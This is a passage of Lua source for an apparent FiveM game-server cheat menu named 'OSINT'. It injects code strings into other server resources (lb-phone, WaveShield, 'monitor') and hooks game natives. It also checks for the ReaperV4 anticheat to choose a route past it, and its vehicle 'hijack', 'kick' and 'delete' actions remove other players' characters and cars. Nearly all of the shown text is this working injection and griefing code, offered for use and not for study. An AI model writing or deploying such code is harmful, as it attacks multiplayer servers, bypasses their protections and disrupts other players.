                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.OSINTFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function KickFromVehicle(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        KickFromVehicle(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Hijack Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.OSINTFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Delete Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.OSINTFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    MachoInjectResource("monitor", [[
                                        DeleteEntity(]] .. vehicle .. [[)
                                    ]])
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    MachoInjectResource("monitor", [[
                                        DeleteEntity(]] .. vehicle .. [[)
                                    ]])
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end

        local hoveredTab = CurrentMenu[HoveredIndex]

        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    if IsControlPressed(0, 174) and now - lastSliderPress > sliderDelay then
                        OSINT:ScrollTwo("Left")
                        lastSliderPress = now
                    elseif IsControlPressed(0, 175) and now - lastSliderPress > sliderDelay then
                        OSINT:ScrollTwo("Right")
                        lastSliderPress = now
                    end
                else
                    if IsControlPressed(0, 174) then
                        OSINT:ScrollTwo("Left")
                    elseif IsControlPressed(0, 175) then
                        OSINT:ScrollTwo("Right")
                    end
                end
            end
        end
    end
end)

local lastScrollPress = 0
local scrollDelay = 120
local lastSliderPress = 0
local sliderDelay = 120
local lastCategoryPress = 0
local categoryDelay = 120

MachoOnKeyDown(function(Callback)
    local keyCode = tonumber(Callback) or Callback
    local keyName = MappedKeys[keyCode] or "Unknown"
    local scrollNow = GetGameTimer()

    if keyName == MenuKey then
        if not IsVisible and MenuOpenable then
            OSINT:ShowUI()
        end
    elseif keyName == "Backspace" then
        if IsVisible and MenuOpenable then OSINT:Backspace() end
    elseif keyName == "Enter" then
        if IsVisible and MenuOpenable then OSINT:Enter() end
    elseif keyName == "Q" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then OSINT:PrevCategory() end
    elseif keyName == "E" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then OSINT:NextCategory() end
    elseif keyName == "ArrowUp" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then OSINT:ScrollOne("Up") lastScrollPress = scrollNow end
    elseif keyName == "ArrowDown" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then OSINT:ScrollOne("Down") lastScrollPress = scrollNow end
    elseif keyName == "ArrowLeft" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    OSINT:ScrollTwo("Left")
                    lastSliderPress = now
                else
                    OSINT:ScrollTwo("Left")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                OSINT:ScrollTwo("Left")
            end
        end
    elseif keyName == "ArrowRight" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    OSINT:ScrollTwo("Right")
                    lastSliderPress = now
                else
                    OSINT:ScrollTwo("Right")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                OSINT:ScrollTwo("Right")
            end
        end
    elseif keyName == "F5" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if IsVisible and MenuOpenable and hoveredTab and (hoveredTab.type == "button" or hoveredTab.type == "checkbox" or hoveredTab.type == "slider-checkbox") then
            OSINT:HideUI()
            Wait(250)
            KeyboardInput(("Bind %s"):format(hoveredTab.label), "", function(val)
                for vk, name in pairs(MappedKeys) do
                    if name:lower() == val:lower() then
                        local fivemControl = VK_TO_FIVEM[vk]

                        for i, data in pairs(MenuKeybinds) do
                            if data.keyRaw == vk then
                                OSINT:Notify("error", "OSINT", "There is already a keybind with that key!", 3000)
                                return
                            end
                        end

                        if fivemControl then
                            MenuKeybinds[#MenuKeybinds + 1] = {
                                key = fivemControl,
                                keyRaw = vk,
                                keyLabel = MappedKeys[vk],
                                type = hoveredTab.type,
                                label = hoveredTab.label,
                                checked = hoveredTab.checked or false,
                                value = hoveredTab.value or 1.0,
                                step = hoveredTab.step or 0.25,
                                min = hoveredTab.min or 0.25,
                                max = hoveredTab.max or 5.0,
                                onSelect = hoveredTab.onSelect,
                            }

                            OSINT:ShowKeybindList(MenuKeybinds)
                        end

                        Wait(500)
                        OSINT:ShowUI()

                        return
                    end
                end
            end, "keybind")
        end
    else
        if MenuOpenable then
            for _, data in pairs(MenuKeybinds) do
                if data.type == "button" then
                    local key = data.keyRaw
                    if key then
                        if key == keyCode then
                            data.onSelect()
                            OSINT:Notify("success", "OSINT", ("You have executed %s!"):format(data.label), 3000)
                        end
                    end
                elseif data.type == "checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        OSINT:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.checked)
                        end

                        OSINT:ShowKeybindList(MenuKeybinds)
                        OSINT:Notify(data.checked and "success" or "error", "OSINT", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            OSINT:UpdateElements(CurrentMenu)
                        end
                    end
                elseif data.type == "slider-checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        OSINT:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.value, data.checked)
                        end

                        OSINT:ShowKeybindList(MenuKeybinds)
